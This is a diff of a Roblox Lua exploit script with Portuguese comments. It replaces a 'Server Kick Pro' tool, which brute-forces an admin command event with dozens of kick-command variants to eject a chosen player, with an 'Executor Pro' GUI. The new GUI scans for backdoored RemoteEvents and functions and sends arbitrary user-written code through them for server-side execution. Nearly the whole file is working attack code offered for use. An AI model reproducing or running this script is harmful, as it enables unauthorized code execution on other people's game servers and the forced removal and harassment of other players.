@@ -1,18 +1,18 @@
 --[[
-    👢 Server Kick Pro Final – Força bruta e backdoors
-    Interface completa, arrastável, botão de fechar.
-    Tenta kickar o jogador selecionado via múltiplos vetores,
-    incluindo força bruta no AdminGuiCommandEvent.
---]]
+    🔥 Executor Pro Xeno-style – Client & Server
+    Interface inspirada no Xeno, com botão Attach, editor, console,
+    execução client-side e server-side via backdoors.
+    Arrastável, botões de ação, scanner de backdoors.
+]]
 
 local Players = game:GetService("Players")
 local Player = Players.LocalPlayer
 local UIS = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
 local CoreGui = game:GetService("CoreGui")
-local Workspace = game:GetService("Workspace")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local ServerStorage = game:GetService("ServerStorage")
+local Workspace = game:GetService("Workspace")
 local Lighting = game:GetService("Lighting")
 
 -- Aguarda personagem
@@ -63,37 +63,32 @@ end
 
 -- ==================== INTERFACE ====================
 local gui = Instance.new("ScreenGui")
-gui.Name = "ServerKickPro"
+gui.Name = "ExecutorPro"
 gui.Parent = CoreGui
 gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 gui.ResetOnSpawn = false
 
 local Main = Instance.new("Frame")
 Main.Parent = gui
-Main.BackgroundColor3 = Color3.fromRGB(18, 18, 28)
+Main.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
 Main.BorderSizePixel = 0
-Main.Size = UDim2.new(0, 320, 0, 420)
-Main.Position = UDim2.new(0.5, -160, 0.5, -210)
+Main.Size = UDim2.new(0, 620, 0, 420)
+Main.Position = UDim2.new(0.5, -310, 0.5, -210)
 Main.ClipsDescendants = true
-Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 12)
-Instance.new("UIStroke", Main).Color = Color3.fromRGB(255, 0, 0)
+Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 8)
+Instance.new("UIStroke", Main).Color = Color3.fromRGB(60, 60, 70)
+Instance.new("UIStroke", Main).Thickness = 1
 
--- Título
+-- Barra de título (arraste)
 local TitleBar = Instance.new("Frame")
 TitleBar.Parent = Main
-TitleBar.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
+TitleBar.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
 TitleBar.BorderSizePixel = 0
-TitleBar.Size = UDim2.new(1, 0, 0, 40)
-local titleGradient = Instance.new("UIGradient", TitleBar)
-titleGradient.Color = ColorSequence.new({
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 0, 0)),
-})
-titleGradient.Rotation = 90
-Instance.new("UICorner", TitleBar).CornerRadius = UDim.new(0, 12)
+TitleBar.Size = UDim2.new(1, 0, 0, 32)
+Instance.new("UICorner", TitleBar).CornerRadius = UDim.new(0, 8)
 local titleFix = Instance.new("Frame")
 titleFix.Parent = TitleBar
-titleFix.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
+titleFix.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
 titleFix.BorderSizePixel = 0
 titleFix.Size = UDim2.new(1, 0, 0, 12)
 titleFix.Position = UDim2.new(0, 0, 1, -12)
@@ -101,152 +96,208 @@ titleFix.Position = UDim2.new(0, 0, 1, -12)
 local TitleText = Instance.new("TextLabel")
 TitleText.Parent = TitleBar
 TitleText.BackgroundTransparency = 1
-TitleText.Position = UDim2.new(0, 15, 0, 0)
-TitleText.Size = UDim2.new(1, -50, 1, 0)
-TitleText.Font = Enum.Font.GothamBlack
-TitleText.Text = "👢 Server Kick Pro"
-TitleText.TextColor3 = Color3.fromRGB(255, 255, 255)
-TitleText.TextSize = 16
+TitleText.Position = UDim2.new(0, 10, 0, 0)
+TitleText.Size = UDim2.new(1, -120, 1, 0)
+TitleText.Font = Enum.Font.GothamBold
+TitleText.Text = "🔴 Roblox Executor Pro"
+TitleText.TextColor3 = Color3.fromRGB(220, 220, 230)
+TitleText.TextSize = 14
 TitleText.TextXAlignment = Enum.TextXAlignment.Left
 
+-- Botão Attach (canto superior direito)
+local AttachBtn = Instance.new("TextButton")
+AttachBtn.Parent = TitleBar
+AttachBtn.BackgroundColor3 = Color3.fromRGB(70, 130, 180)
+AttachBtn.BorderSizePixel = 0
+AttachBtn.Position = UDim2.new(1, -80, 0, 5)
+AttachBtn.Size = UDim2.new(0, 70, 0, 22)
+AttachBtn.Text = "Attach"
+AttachBtn.Font = Enum.Font.GothamBold
+AttachBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+AttachBtn.TextSize = 11
+Instance.new("UICorner", AttachBtn).CornerRadius = UDim.new(0, 4)
+
+-- Botão Fechar
 local CloseBtn = Instance.new("TextButton")
 CloseBtn.Parent = TitleBar
-CloseBtn.BackgroundColor3 = Color3.fromRGB(255, 71, 87)
+CloseBtn.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
 CloseBtn.BorderSizePixel = 0
-CloseBtn.Position = UDim2.new(1, -35, 0, 8)
-CloseBtn.Size = UDim2.new(0, 24, 0, 24)
+CloseBtn.Position = UDim2.new(1, -35, 0, 5)
+CloseBtn.Size = UDim2.new(0, 22, 0, 22)
 CloseBtn.Text = "✕"
 CloseBtn.Font = Enum.Font.GothamBlack
 CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
 CloseBtn.TextSize = 12
-Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 6)
-CloseBtn.MouseButton1Click:Connect(function() gui:Destroy() Notify("Kick", "Fechado") end)
+Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 4)
+CloseBtn.MouseButton1Click:Connect(function() gui:Destroy() Notify("Executor", "Fechado") end)
 
--- Lista de jogadores
-local PlayerList = Instance.new("ScrollingFrame")
-PlayerList.Parent = Main
-PlayerList.BackgroundTransparency = 1
-PlayerList.BorderSizePixel = 0
-PlayerList.Position = UDim2.new(0, 10, 0, 50)
-PlayerList.Size = UDim2.new(1, -20, 0, 200)
-PlayerList.ScrollBarThickness = 3
-PlayerList.ScrollBarImageColor3 = Color3.fromRGB(255, 0, 0)
-PlayerList.CanvasSize = UDim2.new(0, 0, 0, 0)
+-- Abas (Editor / Console)
+local TabFrame = Instance.new("Frame")
+TabFrame.Parent = Main
+TabFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+TabFrame.BorderSizePixel = 0
+TabFrame.Position = UDim2.new(0, 0, 0, 32)
+TabFrame.Size = UDim2.new(1, 0, 0, 28)
 
-local PlayerListLayout = Instance.new("UIListLayout")
-PlayerListLayout.Parent = PlayerList
-PlayerListLayout.Padding = UDim.new(0, 4)
-PlayerListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+local EditorTab = Instance.new("TextButton")
+EditorTab.Parent = TabFrame
+EditorTab.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
+EditorTab.BorderSizePixel = 0
+EditorTab.Position = UDim2.new(0, 10, 0, 2)
+EditorTab.Size = UDim2.new(0, 60, 0, 24)
+EditorTab.Text = "Editor"
+EditorTab.Font = Enum.Font.GothamBold
+EditorTab.TextColor3 = Color3.fromRGB(255, 255, 255)
+EditorTab.TextSize = 11
+Instance.new("UICorner", EditorTab).CornerRadius = UDim.new(0, 4)
 
--- Botões
-local ScanBtn = Instance.new("TextButton")
-ScanBtn.Parent = Main
-ScanBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 120)
-ScanBtn.BorderSizePixel = 0
-ScanBtn.Position = UDim2.new(0, 10, 0, 256)
-ScanBtn.Size = UDim2.new(1, -20, 0, 30)
-ScanBtn.Text = "🔍 RE-ESCANEAR BACKDOORS"
-ScanBtn.Font = Enum.Font.GothamBlack
-ScanBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-ScanBtn.TextSize = 11
-Instance.new("UICorner", ScanBtn).CornerRadius = UDim.new(0, 8)
+local ConsoleTab = Instance.new("TextButton")
+ConsoleTab.Parent = TabFrame
+ConsoleTab.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+ConsoleTab.BorderSizePixel = 0
+ConsoleTab.Position = UDim2.new(0, 75, 0, 2)
+ConsoleTab.Size = UDim2.new(0, 70, 0, 24)
+ConsoleTab.Text = "Console"
+ConsoleTab.Font = Enum.Font.GothamBold
+ConsoleTab.TextColor3 = Color3.fromRGB(180, 180, 190)
+ConsoleTab.TextSize = 11
+Instance.new("UICorner", ConsoleTab).CornerRadius = UDim.new(0, 4)
 
-local KickBtn = Instance.new("TextButton")
-KickBtn.Parent = Main
-KickBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-KickBtn.BorderSizePixel = 0
-KickBtn.Position = UDim2.new(0, 10, 0, 290)
-KickBtn.Size = UDim2.new(1, -20, 0, 34)
-KickBtn.Text = "👢 KICKAR JOGADOR SELECIONADO"
-KickBtn.Font = Enum.Font.GothamBlack
-KickBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-KickBtn.TextSize = 12
-Instance.new("UICorner", KickBtn).CornerRadius = UDim.new(0, 8)
+-- Container para as páginas
+local EditorPage = Instance.new("Frame")
+EditorPage.Parent = Main
+EditorPage.BackgroundTransparency = 1
+EditorPage.Position = UDim2.new(0, 10, 0, 65)
+EditorPage.Size = UDim2.new(1, -20, 1, -115)
+EditorPage.Visible = true
 
--- Console
+local ConsolePage = Instance.new("Frame")
+ConsolePage.Parent = Main
+ConsolePage.BackgroundTransparency = 1
+ConsolePage.Position = UDim2.new(0, 10, 0, 65)
+ConsolePage.Size = UDim2.new(1, -20, 1, -115)
+ConsolePage.Visible = false
+
+-- Editor de script
+local Editor = Instance.new("TextBox")
+Editor.Parent = EditorPage
+Editor.BackgroundColor3 = Color3.fromRGB(20, 20, 28)
+Editor.BorderSizePixel = 0
+Editor.Size = UDim2.new(1, 0, 1, 0)
+Editor.Font = Enum.Font.Code
+Editor.Text = "-- Cole seu script aqui\nprint('Hello, world!')"
+Editor.TextColor3 = Color3.fromRGB(200, 200, 220)
+Editor.TextSize = 13
+Editor.ClearTextOnFocus = false
+Editor.TextEditable = true
+Editor.TextWrapped = true
+Editor.TextXAlignment = Enum.TextXAlignment.Left
+Editor.TextYAlignment = Enum.TextYAlignment.Top
+Instance.new("UICorner", Editor).CornerRadius = UDim.new(0, 4)
+
+-- Console de saída
 local Console = Instance.new("TextBox")
-Console.Parent = Main
-Console.BackgroundColor3 = Color3.fromRGB(12, 12, 20)
+Console.Parent = ConsolePage
+Console.BackgroundColor3 = Color3.fromRGB(20, 20, 28)
 Console.BorderSizePixel = 0
-Console.Position = UDim2.new(0, 10, 0, 330)
-Console.Size = UDim2.new(1, -20, 0, 78)
+Console.Size = UDim2.new(1, 0, 1, 0)
 Console.Font = Enum.Font.Code
 Console.Text = "Console: Aguardando...\n"
 Console.TextColor3 = Color3.fromRGB(180, 180, 200)
-Console.TextSize = 10
+Console.TextSize = 12
 Console.ClearTextOnFocus = false
 Console.TextEditable = false
 Console.TextWrapped = true
 Console.TextXAlignment = Enum.TextXAlignment.Left
 Console.TextYAlignment = Enum.TextYAlignment.Top
-Instance.new("UICorner", Console).CornerRadius = UDim.new(0, 6)
+Instance.new("UICorner", Console).CornerRadius = UDim.new(0, 4)
 
 local function Log(msg)
     Console.Text = Console.Text .. msg .. "\n"
 end
 
--- ==================== LISTA DE JOGADORES ====================
-local selectedPlayer = nil
-local playerButtons = {}
+-- Botões de ação (barra inferior)
+local BottomBar = Instance.new("Frame")
+BottomBar.Parent = Main
+BottomBar.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
+BottomBar.BorderSizePixel = 0
+BottomBar.Position = UDim2.new(0, 0, 1, -45)
+BottomBar.Size = UDim2.new(1, 0, 0, 45)
 
-local function refreshPlayerList()
-    for _, btn in ipairs(playerButtons) do btn:Destroy() end
-    playerButtons = {}
-    for _, p in ipairs(Players:GetPlayers()) do
-        if p ~= Player then
-            local btn = Instance.new("TextButton")
-            btn.Parent = PlayerList
-            btn.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
-            btn.BorderSizePixel = 0
-            btn.Size = UDim2.new(1, -10, 0, 30)
-            btn.Text = p.Name
-            btn.Font = Enum.Font.Gotham
-            btn.TextColor3 = Color3.fromRGB(200, 200, 220)
-            btn.TextSize = 12
-            Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
-            btn.MouseButton1Click:Connect(function()
-                selectedPlayer = p
-                for _, b in ipairs(playerButtons) do b.BackgroundColor3 = Color3.fromRGB(30, 30, 40) end
-                btn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-                Log("Selecionado: " .. p.Name)
-            end)
-            table.insert(playerButtons, btn)
-        end
-    end
-    PlayerList.CanvasSize = UDim2.new(0, 0, 0, #playerButtons * 34)
-end
-refreshPlayerList()
-Players.PlayerAdded:Connect(refreshPlayerList)
-Players.PlayerRemoving:Connect(function(p)
-    if p == selectedPlayer then selectedPlayer = nil end
-    task.wait(0.1)
-    refreshPlayerList()
-end)
+local RunClientBtn = Instance.new("TextButton")
+RunClientBtn.Parent = BottomBar
+RunClientBtn.BackgroundColor3 = Color3.fromRGB(70, 130, 180)
+RunClientBtn.BorderSizePixel = 0
+RunClientBtn.Position = UDim2.new(0, 10, 0, 10)
+RunClientBtn.Size = UDim2.new(0, 100, 0, 28)
+RunClientBtn.Text = "▶ Run (Client)"
+RunClientBtn.Font = Enum.Font.GothamBold
+RunClientBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+RunClientBtn.TextSize = 11
+Instance.new("UICorner", RunClientBtn).CornerRadius = UDim.new(0, 4)
 
--- ==================== BACKDOORS & KICK LOGIC ====================
+local RunServerBtn = Instance.new("TextButton")
+RunServerBtn.Parent = BottomBar
+RunServerBtn.BackgroundColor3 = Color3.fromRGB(180, 70, 70)
+RunServerBtn.BorderSizePixel = 0
+RunServerBtn.Position = UDim2.new(0, 120, 0, 10)
+RunServerBtn.Size = UDim2.new(0, 100, 0, 28)
+RunServerBtn.Text = "▶ Run (Server)"
+RunServerBtn.Font = Enum.Font.GothamBold
+RunServerBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+RunServerBtn.TextSize = 11
+Instance.new("UICorner", RunServerBtn).CornerRadius = UDim.new(0, 4)
+
+local ClearBtn = Instance.new("TextButton")
+ClearBtn.Parent = BottomBar
+ClearBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
+ClearBtn.BorderSizePixel = 0
+ClearBtn.Position = UDim2.new(0, 230, 0, 10)
+ClearBtn.Size = UDim2.new(0, 70, 0, 28)
+ClearBtn.Text = "🗑️ Clear"
+ClearBtn.Font = Enum.Font.GothamBold
+ClearBtn.TextColor3 = Color3.fromRGB(200, 200, 210)
+ClearBtn.TextSize = 11
+Instance.new("UICorner", ClearBtn).CornerRadius = UDim.new(0, 4)
+
+local OpenBtn = Instance.new("TextButton")
+OpenBtn.Parent = BottomBar
+OpenBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
+OpenBtn.BorderSizePixel = 0
+OpenBtn.Position = UDim2.new(0, 310, 0, 10)
+OpenBtn.Size = UDim2.new(0, 80, 0, 28)
+OpenBtn.Text = "📂 Abrir"
+OpenBtn.Font = Enum.Font.GothamBold
+OpenBtn.TextColor3 = Color3.fromRGB(200, 200, 210)
+OpenBtn.TextSize = 11
+Instance.new("UICorner", OpenBtn).CornerRadius = UDim.new(0, 4)
+
+-- Barra de status
+local StatusBar = Instance.new("Frame")
+StatusBar.Parent = Main
+StatusBar.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
+StatusBar.BorderSizePixel = 0
+StatusBar.Position = UDim2.new(0, 0, 1, -3)
+StatusBar.Size = UDim2.new(1, 0, 0, 3)
+
+local StatusText = Instance.new("TextLabel")
+StatusText.Parent = StatusBar
+StatusText.BackgroundTransparency = 1
+StatusText.Position = UDim2.new(0, 10, 0, -15)
+StatusText.Size = UDim2.new(1, -20, 0, 14)
+StatusText.Font = Enum.Font.Gotham
+StatusText.Text = "Pronto."
+StatusText.TextColor3 = Color3.fromRGB(150, 150, 160)
+StatusText.TextSize = 10
+StatusText.TextXAlignment = Enum.TextXAlignment.Left
+
+-- ==================== SCANNER DE BACKDOORS ====================
 local backdoors = {}
-
--- Procura um RemoteEvent específico em todos os lugares acessíveis
-local function findRemoteEvent(name)
-    local function search(container)
-        for _, obj in ipairs(container:GetChildren()) do
-            if obj:IsA("RemoteEvent") and obj.Name == name then
-                return obj
-            end
-            local found = search(obj)
-            if found then return found end
-        end
-        return nil
-    end
-    return search(Workspace) or search(ReplicatedStorage) or search(ServerStorage)
-end
 
 local function scanBackdoors()
     backdoors = {}
-    Console.Text = ""
     Log("🔍 Escaneando backdoors...")
 
-    -- _G, shared
     local funcs = {"loadstring", "execute", "run", "eval", "exec", "RunScript", "ServerScript", "require"}
     for _, fn in ipairs(funcs) do
         if _G[fn] and type(_G[fn]) == "function" then
@@ -259,7 +310,6 @@ local function scanBackdoors()
         end
     end
 
-    -- RemoteEvents/RemoteFunctions suspeitos
     local suspicious = {"Execute", "Run", "Load", "Eval", "Script", "Server", "Command", "Admin", "Backdoor", "Kick", "Fire", "Invoke", "DoScript", "RunCode", "Exec"}
     local function search(container, depth)
         if depth > 50 then return end
@@ -289,128 +339,122 @@ local function scanBackdoors()
     if #backdoors == 0 then Log("⚠️ Nenhuma backdoor encontrada.") end
 end
 
--- Script de kick genérico
-local kickScript = [[
-local targetName = "TARGET_NAME"
-local Players = game:GetService("Players")
-local target = Players:FindFirstChild(targetName)
-if target then
-    target:Kick("Expulso pelo Server Kick Pro")
-    return "OK"
-end
-return "Jogador não encontrado"
-]]
-
--- Lista de argumentos para força bruta no AdminGuiCommandEvent (focando em kick)
-local bruteForceArgs = {}
--- Preenche com vários formatos para kickar o alvo
-local function buildBruteForce(targetName)
-    local bf = {
-        {"kick", targetName},
-        {"kick", targetName, "Expulso"},
-        {":kick", targetName},
-        {"/kick", targetName},
-        {"!kick", targetName},
-        {"k", targetName},
-        {"k", targetName, "Expulso"},
-        {targetName, "kick"},
-        {"kick " .. targetName},
-        {":kick " .. targetName},
-        {"/kick " .. targetName},
-        {"!kick " .. targetName},
-        {"k " .. targetName},
-        {{Command = "kick", Args = {targetName}}},
-        {{Command = "Kick", Args = {targetName}}},
-        {{command = "kick", args = {targetName}}},
-        {{cmd = "kick", data = targetName}},
-        {{action = "kick", target = targetName}},
-        {{type = "kick", player = targetName}},
-        {{Type = "Kick", Player = targetName}},
-        {{Event = "kick", Name = targetName}},
-        {{event = "kick", name = targetName}},
-        {{request = "kick", who = targetName}},
-        {{do = "kick", to = targetName}},
-        {{task = "kick", on = targetName}},
-        {{"kick", targetName}},
-        {{"k", targetName}},
-        {{":kick", targetName}},
-        {{"Adonis", "kick", targetName}},
-        {{"adonis", "kick", targetName}},
-        {"kick", targetName, "Adonis"},
-        {{"HDAdmin", "kick", targetName}},
-        {{"hdadmin", "kick", targetName}},
-        {"hd", "kick", targetName},
-    }
-    return bf
+-- ==================== EXECUÇÃO ====================
+-- Client-side execution
+local function executeClient(code)
+    local func, err = loadstring(code)
+    if not func then
+        Log("❌ Erro de sintaxe (client): " .. tostring(err))
+        return false
+    end
+    local success, result = pcall(func)
+    if success then
+        Log("✅ Executado no cliente.")
+        if result then Log("📤 Retorno: " .. tostring(result)) end
+        return true
+    else
+        Log("❌ Erro em execução (client): " .. tostring(result))
+        return false
+    end
 end
 
--- Executa o kick via todos os vetores
-local function executeKick(targetPlayer)
-    local targetName = targetPlayer.Name
-
-    -- 1. Tenta via backdoors genéricas
-    local code = kickScript:gsub("TARGET_NAME", targetName)
+-- Server-side execution via backdoors
+local function executeServer(code)
+    if #backdoors == 0 then
+        Log("❌ Nenhuma backdoor disponível para execução server-side.")
+        return false
+    end
+    Log("🚀 Enviando para o servidor...")
     for _, bd in ipairs(backdoors) do
         local ok, err
         if bd.type == "RemoteEvent" then
             ok, err = pcall(function() bd.remote:FireServer(code) end)
-            if ok then Log("✅ Kick via " .. bd.name); return true end
+            if ok then Log("✅ Enviado via " .. bd.name); return true end
             Log("❌ Falha " .. bd.name .. ": " .. tostring(err))
         elseif bd.type == "RemoteFunction" then
             local res
             ok, res = pcall(function() return bd.remote:InvokeServer(code) end)
-            if ok and res then Log("✅ Kick via " .. bd.name); return true end
+            if ok and res then Log("✅ Invocado via " .. bd.name .. " (retorno: " .. tostring(res) .. ")"); return true end
             Log("❌ Falha " .. bd.name .. ": " .. tostring(res))
         elseif bd.type == "function" then
             ok, err = pcall(function() bd.func(code) end)
-            if ok then Log("✅ Kick via " .. bd.name); return true end
+            if ok then Log("✅ Executado via " .. bd.name); return true end
             Log("❌ Falha " .. bd.name .. ": " .. tostring(err))
         end
     end
-
-    -- 2. Força bruta no AdminGuiCommandEvent
-    local adminEvent = findRemoteEvent("AdminGuiCommandEvent")
-    if adminEvent then
-        Log("🔨 Força bruta no AdminGuiCommandEvent...")
-        local bfArgs = buildBruteForce(targetName)
-        for i, args in ipairs(bfArgs) do
-            local success, err = pcall(function()
-                adminEvent:FireServer(unpack(args))
-            end)
-            if success then
-                Log("✅ Tentativa " .. i .. " enviada.")
-                -- Não sabemos se funcionou, mas assumimos que pode ter funcionado.
-                -- Se o kick ocorrer, o jogador desaparecerá.
-                -- Vamos dar um retorno positivo após tentar tudo.
-            else
-                Log("❌ Tentativa " .. i .. " erro: " .. tostring(err))
-            end
-            task.wait(0.05)
-        end
-        Log("⚡ Força bruta concluída. Verifique se o jogador foi expulso.")
-        return true  -- assume que alguma tentativa pode ter funcionado
-    else
-        Log("⚠️ AdminGuiCommandEvent não encontrado para força bruta.")
-    end
-
     return false
 end
 
 -- ==================== EVENTOS ====================
-ScanBtn.MouseButton1Click:Connect(scanBackdoors)
+-- Attach button
+AttachBtn.MouseButton1Click:Connect(function()
+    AttachBtn.Text = "Scanning..."
+    AttachBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+    task.wait(0.1)
+    scanBackdoors()
+    if #backdoors > 0 then
+        AttachBtn.Text = "Attached"
+        AttachBtn.BackgroundColor3 = Color3.fromRGB(70, 180, 70)
+    else
+        AttachBtn.Text = "Attach"
+        AttachBtn.BackgroundColor3 = Color3.fromRGB(70, 130, 180)
+    end
+end)
 
-KickBtn.MouseButton1Click:Connect(function()
-    if not selectedPlayer then Log("Selecione um jogador!"); return end
-    if #backdoors == 0 and not findRemoteEvent("AdminGuiCommandEvent") then
-        Log("Nenhum vetor de ataque. Escaneie primeiro!")
+-- Abas
+EditorTab.MouseButton1Click:Connect(function()
+    EditorTab.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
+    EditorTab.TextColor3 = Color3.fromRGB(255, 255, 255)
+    ConsoleTab.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+    ConsoleTab.TextColor3 = Color3.fromRGB(180, 180, 190)
+    EditorPage.Visible = true
+    ConsolePage.Visible = false
+end)
+ConsoleTab.MouseButton1Click:Connect(function()
+    ConsoleTab.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
+    ConsoleTab.TextColor3 = Color3.fromRGB(255, 255, 255)
+    EditorTab.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+    EditorTab.TextColor3 = Color3.fromRGB(180, 180, 190)
+    EditorPage.Visible = false
+    ConsolePage.Visible = true
+end)
+
+-- Botões de execução
+RunClientBtn.MouseButton1Click:Connect(function()
+    local code = Editor.Text
+    if code:gsub("%s", "") == "" then
+        Notify("Aviso", "Digite um script primeiro!")
         return
     end
-    Log("👢 Kickando " .. selectedPlayer.Name .. "...")
-    if executeKick(selectedPlayer) then
-        Notify("Kick", "Comando enviado para " .. selectedPlayer.Name, 2)
+    Log("📝 Executando no cliente...")
+    executeClient(code)
+end)
+
+RunServerBtn.MouseButton1Click:Connect(function()
+    local code = Editor.Text
+    if code:gsub("%s", "") == "" then
+        Notify("Aviso", "Digite um script primeiro!")
+        return
+    end
+    Log("📝 Executando no servidor...")
+    executeServer(code)
+end)
+
+ClearBtn.MouseButton1Click:Connect(function()
+    Editor.Text = ""
+    Log("🧹 Editor limpo.")
+end)
+
+OpenBtn.MouseButton1Click:Connect(function()
+    -- Tenta usar função de leitura de arquivo do executor (se existir)
+    local success, content = pcall(function()
+        return readfile and readfile("script.txt") or nil
+    end)
+    if success and content then
+        Editor.Text = content
+        Log("📂 Arquivo carregado.")
     else
-        Log("❌ Falha ao kickar.")
-        Notify("Falha", "Não foi possível kickar o jogador.")
+        Notify("Aviso", "readfile não disponível ou arquivo não encontrado.")
     end
 end)
 
@@ -449,6 +493,9 @@ end)
 
 -- ==================== INICIALIZAÇÃO ====================
 scanBackdoors()
-task.spawn(function() while gui and gui.Parent do task.wait(5) refreshPlayerList() end end)
+if #backdoors > 0 then
+    AttachBtn.Text = "Attached"
+    AttachBtn.BackgroundColor3 = Color3.fromRGB(70, 180, 70)
+end
 
-Notify("👢 Server Kick Pro", "Escaneie backdoors e selecione um jogador para kickar!", 5)
+Notify("Executor Pro", "Interface carregada. Use Attach para scan e execute scripts.", 5)
